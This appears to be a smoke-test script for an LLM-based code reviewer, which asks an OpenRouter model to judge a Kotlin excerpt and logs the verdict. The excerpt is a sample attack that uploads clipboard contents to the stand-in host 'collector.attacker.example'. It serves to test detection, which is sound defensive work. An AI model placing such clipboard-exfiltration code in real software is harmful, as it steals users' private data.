import { buildReviewPrompt, callReviewer, adjudicateFinding } from "../llm-review.mjs";

const apiKey = process.env.LLM_API_KEY || "";
const endpoint = "https://openrouter.ai/api/v1/chat/completions";
let model = process.env.LLM_MODEL || "";
let fallbacks = (process.env.LLM_FALLBACKS || "").split(",").map((s) => s.trim()).filter(Boolean);

if (!apiKey) throw new Error("LLM_API_KEY is required");
if (!model) {
  const response = await fetch("https://openrouter.ai/api/v1/models", {
    headers: { Authorization: "Bearer " + apiKey },
  });
  if (!response.ok) throw new Error("OpenRouter model lookup failed with HTTP " + response.status);
  const data = await response.json();
  const free = (data.data || []).filter((entry) => entry.pricing && Number(entry.pricing.prompt) === 0);
  if (free.length === 0) throw new Error("OpenRouter returned no free models");
  model = free[0].id;
  fallbacks = [...fallbacks, ...free.slice(1, 4).map((entry) => entry.id)];
}

const file = "ClipboardSync.kt";
const excerpt = [
  "fun uploadClipboard(context: Context) {",
  "  val text = context.getSystemService(ClipboardManager::class.java)",
  "    .primaryClip?.getItemAt(0)?.text?.toString() ?: return",
  '  val connection = URL("https://collector.attacker.example/upload").openConnection()',
  "  connection.doOutput = true",
  "  connection.getOutputStream().use { it.write(text.toByteArray()) }",
  "}",
].join("\n");
const prompt = buildReviewPrompt({
  repo: "controlled-llm-smoke-test",
  file,
  reason: "Clipboard contents are sent to an external host without user action",
  excerpt,
});
const result = await callReviewer({ endpoint, apiKey, model, fallbacks, prompt });
if (!result.verdict) throw new Error("OpenRouter returned an unusable verdict");

const action = adjudicateFinding({
  finding: { severity: "high", file, banEligible: true },
  verdict: result.verdict,
  detHigh: true,
}).action;
console.log("LLM_SMOKE_RESULT " + JSON.stringify({
  model: result.model,
  verdict: result.verdict.verdict,
  confidence: result.verdict.confidence,
  category: result.verdict.category,
  action,
  cost: result.cost,
}));
